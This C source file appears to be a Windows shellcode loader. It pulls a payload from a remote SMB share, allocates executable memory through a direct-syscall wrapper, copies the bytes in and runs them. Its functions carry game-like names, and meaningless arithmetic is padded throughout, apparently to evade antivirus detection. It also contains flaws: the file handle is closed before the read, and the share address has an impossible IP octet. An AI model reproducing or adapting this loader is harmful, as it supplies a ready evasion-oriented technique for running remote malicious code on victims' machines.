#include <windows.h>
#include <stdio.h>

#include "Syscalls.h"

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
	if (SourceString) {
		DestinationString->Buffer = (PWSTR)SourceString;
		DestinationString->Length = (USHORT)wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
	}
	else {
		DestinationString->Buffer = NULL;
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}
}

int add(int a, int b) {
	return a + b;
}

unsigned char  ahaaa[460];
PVOID createTheGame() {
	HANDLE a = GetCurrentProcess();
	PVOID b = NULL;
	SIZE_T c = sizeof(ahaaa);
	ULONG d = MEM_COMMIT | MEM_RESERVE;
	ULONG f = PAGE_EXECUTE_READWRITE;

	NTSTATUS status = Play(
		a,
		&b,
		0,
		&c,
		d,
		f

	);
	int sum = add(5, 9);
	if (sum >= 2) {
		add(sum, 100000);
	}
	return b;
}


void FindPlayerX(const wchar_t *fileName) {
	HANDLE hFile;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK iosstatusBlock;
	UNICODE_STRING uniName;
	RtlInitUnicodeString(&uniName, fileName);
	InitializeObjectAttributes(&objAttr, &uniName, 0, NULL, NULL);

	NTSTATUS status = NtCreateFile(
		&hFile,
		GENERIC_READ,
		&objAttr,
		&iosstatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		0,
		0,
		NULL,0
	
	
	);
	if (status == 0) {
		CloseHandle(hFile);
	}

	status = NtReadFile(
		hFile,
		NULL, NULL, NULL, &iosstatusBlock, ahaaa, sizeof(ahaaa) - 1, NULL, NULL


	);
}

int alo() {
	int b = 0;
	for (int i = 0; i < 900; ++i) {
		if (i % 2 == 0 || i > 100) {
			b++;
		}
	}
	return b;
}
int main() {
	const wchar_t* fileName = L"\\\\192.168.0.567\\share\\test.bin";

	FindPlayerX(fileName);
	int sum = alo();
	int agfaga = 0;
	if (sum > 10) {
		sum = agfaga;
		agfaga = 10;
	}
	LPVOID pAddr = createTheGame();
	memcpy(pAddr, ahaaa, sizeof(ahaaa));
	((void(*)())pAddr)();
}